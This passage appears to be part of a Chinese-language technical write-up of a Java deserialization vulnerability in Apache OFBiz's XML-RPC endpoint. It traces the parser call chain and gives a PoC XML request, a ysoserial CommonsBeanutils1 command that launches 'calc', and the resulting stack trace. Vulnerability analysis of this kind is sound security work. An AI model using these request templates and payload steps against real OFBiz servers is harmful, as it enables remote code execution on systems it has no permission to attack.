### 响应
- **消息**: PONG
- **说明**: 成功调用 `ping` 方法

### 反序列化点
在 `Ofbiz` 自带的第三方库 `xmlrpc-common-3.1.3.jar` 中的 `org.apache.xmlrpc.parser.SerializableParser` 类中，可以明显看到对数据的反序列化操作。如果恶意构造的数据（gadget）到达此处，可以直接被反序列化而不会被过滤。

### 解析 XML
回到 `org.apache.ofbiz.webapp.control.RequestHandler#runEvent()` 方法，在其随后调用的链中，注意到 `getRequest()` 方法：
```java
org.apache.ofbiz.webapp.control.RequestHandler.runEvent()
  -> org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke()
    -> org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute()
      -> org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
```
在 `getRequest()` 方法中，传入的 XML 数据由第三方库 `xmlrpc-common.jar` 进行解析，并且该处做了 XXE 防护。类的初始化由父类 `org.apache.xmlrpc.parser.RecursiveTypeParserImpl` 完成，该类负责递归解析 XML 元素，包括 `startElement()` 和 `endElement()` 等方法。在解析过程中，会触发 `scanDocument()` 操作，逐一扫描元素并调用相应的解析方法。

特别注意在 `endElement()` 方法中对于 `value` 标签的处理，同样由父类完成。具体来说，在 `org.apache.xmlrpc.parser.RecursiveTypeParserImpl#endValueTag()` 方法中调用了 `getResult()` 方法，这是上述提到的反序列化目标方法。因此，接下来需要构造特定的 XML 数据发送给 `Ofbiz`，如果 `value` 标签中存放的是序列化数据，则会由 `SerializableParser` 类进行反序列化，从而触发漏洞。调用链如下：
```java
org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest()
  -> org.apache.xerces.parsers.AbstractSAXParser.parse()
    -> org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument()
      -> org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement()
        -> org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement()
          -> org.apache.xmlrpc.parser.MapParser.endElement()
            -> org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag()
              -> org.apache.xmlrpc.parser.SerializableParser.getResult()
```

### PoC 构造
以 `ping` 方法为例，假设 POST 如下数据：
```xml
<methodCall>
  <methodName>ping</methodName>
  <params>
    <param>
      <value>test</value>
    </param>
  </params>
</methodCall>
```
`Ofbiz` 能成功解析到 `endValueTag()` 方法，但由于 `typeParser` 属性为空，因此不会进入 `getResult()` 方法。

那么 `typeParser` 属性是在哪里赋值的呢？回到 `org.apache.xmlrpc.parser.XmlRpcRequestParser#startElement()` 方法，在解析器解析 XML 标签时，对四类标签（`methodCall`、`params`、`param`、`value`）有分别的处理。当扫描完这四个必须提供的标签后，会调用父类的 `startElement()` 方法进行处理，`typeParser` 就是在父类中完成赋值的。随后通过不同的解析器进入不同的解析流程，还是会调用对应解析器的 `startElement` 方法，这个过程是递归的。

分析标签的递增过程，发现除了这四个标签外，还需在 `value` 标签中含有额外的标签，才会进入 default 分支进而对 `typeParser` 赋值。此时 `struct` 是一个很好的选择，它可以把数据作为一个结构体传入。

接着思考如何传入序列化数据，即如何控制后端通过 `SerializableParser` 解析数据。关注 `typeParser` 的赋值过程，这个属性就是最终将要处理不同类型数据的解析器。在 `org.apache.xmlrpc.parser.RecursiveTypeParserImpl#startElement()` 方法中，注意到 `factory.getParser()` 操作，将由 `org.apache.xmlrpc.common.TypeFactoryImpl` 类获得不同数据类型的解析类，在其中就有获取 `SerializableParser` 的过程。

因此，只要传入 `struct` 标签便会由 `SerializableParser` 进行解析。此外，标签属性必须带有 `XmlRpcWriter.EXTENSIONS_URI` 才会进入后续的判断流程。因此，POST 的数据如下：
```xml
<methodCall>
  <methodName>ping</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>serialized_data</name>
            <value>
              <base64>...</base64>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

最后一步，数据的格式。在获取到 `SerializableParser` 解析器后，`startElement` 过程由父类 `org.apache.xmlrpc.parser.ByteArrayParser#startElement()` 完成，在其中能看到 base64 的解码操作，所以最终的序列化数据是需要通过 base64 传输的。

### 漏洞利用
`Ofbiz` 中存在 `Commons-Beanutils` 库，因此可以使用 `ysoserial` 直接生成 `CommonsBeanutils1` 的 payload：
```sh
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 calc | base64 | tr -d "\n"
```
输出结果：
```base64
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3I...
```
将生成的 base64 编码的序列化数据填充到 `serialized_data` 并发送。调用链如下：
```java
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
    at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171) ~[commons-beanutils-1.9.3.jar:1.9.3]
    at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721) ~[?:1.8.0_141]
    at java.util.PriorityQueue.siftDown(PriorityQueue.java:687) ~[?:1.8.0_141]
    at java.util.PriorityQueue.heapify(PriorityQueue.java:736) ~[?:1.8.0_141]
    at java.util.PriorityQueue.readObject(PriorityQueue.java:795) ~[?:1.8.0_141]
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_141]
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[?:1.8.0_141]
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[?:1.8.0_141]
    at java.lang.reflect.Method.invoke(Method.java:498) ~[?:1.8.0_141]
    at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1058) ~[?:1.8.0_141]
    at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2136) ~[?:1.8.0_141]
    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2027) ~[?:1.8.0_141]
    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1535) ~[?:1.8.0_141]
    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422) ~[?:1.8.0_141]
    at org.apache.xmlrpc.parser.SerializableParser.getResult(SerializableParser.java:36) ~[xmlrpc-common-3.1.3.jar:3.1.3]
    at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endValueTag(RecursiveTypeParserImpl.java:78) ~[xmlrpc-common-3.1.3.jar:3.1.3]
    at org.apache.xmlrpc.parser.MapParser.endElement(MapParser.java:185) ~[xmlrpc-common-3.1.3.jar:3.1.3]
    at org.apache.xmlrpc.parser.RecursiveTypeParserImpl.endElement(RecursiveTypeParserImpl.java:103) ~[xmlrpc-common-3.1.3.jar:3.1.3]
    at org.apache.xmlrpc.parser.XmlRpcRequestParser.endElement(XmlRpcRequestParser.java:165) ~[xmlrpc-common-3.1.3.jar:3.1.3]
    at org.apache.xerces.parsers.AbstractSAXParser.endElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.xerces.impl.XMLNSDocumentScannerImpl.scanEndElement(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl$FragmentContentDispatcher.dispatch(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.xerces.parsers.XML11Configuration.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.xerces.parsers.XMLParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.xerces.parsers.AbstractSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse(Unknown Source) ~[xercesImpl-2.9.1.jar:?]
    at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.getRequest(XmlRpcEventHandler.java:285) ~[ofbiz.jar:?]
    at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.execute(XmlRpcEventHandler.java:229) [ofbiz.jar:?]
    at org.apache.ofbiz.webapp.event.XmlRpcEventHandler.invoke(XmlRpcEventHandler.java:145) [ofbiz.jar:?]
    at org.apache.ofbiz.webapp.control.RequestHandler.runEvent(RequestHandler.java:741) [ofbiz.jar:?]
    at org.apache.ofbiz.webapp.control.RequestHandler.doRequest(RequestHandler.java:465) [ofbiz.jar:?]
    at org.apache.ofbiz.webapp.control.ControlServlet.doGet(ControlServlet.java:217) [ofbiz.jar:?]
    at org.apache.ofbiz.webapp.control.ControlServlet.doPost(ControlServlet.java:91) [ofbiz.jar:?]
```

这样，通过构造特定的 XML 数据并利用 `SerializableParser` 的反序列化功能，可以触发漏洞并执行任意代码。